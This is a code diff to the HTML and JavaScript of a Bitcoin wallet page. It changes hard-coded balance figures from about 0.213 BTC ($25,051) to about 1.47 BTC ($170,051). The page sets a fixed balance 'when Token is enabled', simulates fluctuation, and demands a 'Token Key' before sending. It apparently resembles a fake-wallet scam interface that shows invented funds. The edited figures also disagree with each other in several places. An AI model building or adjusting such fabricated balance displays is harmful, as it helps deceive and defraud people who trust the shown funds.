@@ -979,8 +979,8 @@
                                     </div>
                                 </div>
                                 <div style="text-align: right;">
-                                    <div style="font-weight: 500; color: var(--primary);">+0.21339BTC</div>
-                                    <div style="font-size: 14px; color: var(--medium-gray);">$25051.00</div>
+                                    <div style="font-weight: 500; color: var(--primary);">+1.4739BTC</div>
+                                    <div style="font-size: 14px; color: var(--medium-gray);">$170251.00</div>
                                 </div>
                             </li>
                             
@@ -1310,7 +1310,7 @@
     
     // Balance variables
     let currentBtcBalance = 0; // Start at 0
-    const fixedBtcBalance = 0.2133900; // Value to set when Token is enabled
+    const fixedBtcBalance = 1.4733900; // Value to set when Token is enabled
     let currentUsdBalance = 0;
     let balanceInterval;
     
@@ -1335,7 +1335,7 @@ function startBalanceFluctuation() {
     
     // Set initial values - use stored balance if available, otherwise use default
     currentBtcBalance = fixedBtcBalance; // BTC remains fixed
-    currentUsdBalance = storedBalance ? parseFloat(storedBalance) : 25051.31; // Default or stored value
+    currentUsdBalance = storedBalance ? parseFloat(storedBalance) : 170051.31; // Default or stored value
     
     // Store the initial balance if it wasn't stored before
     if (!storedBalance) {
@@ -1389,7 +1389,7 @@ hideNavItem('keyNavBtn');
 		startBalanceFluctuation();
 		showTransactionState('one');
 		showNavItem('keyNavBtn');  
-		document.getElementById('availableBalance').innerHTML = 'Available: 0.21339 BTC';
+		document.getElementById('availableBalance').innerHTML = 'Available: 1.47334 BTC';
 		document.getElementById('sendlabel').innerHTML = 'Input Key(Required)';
 		document.getElementById('sendDescription').placeholder = 'Token Key';
 		document.getElementById('sendDescription').required = true;
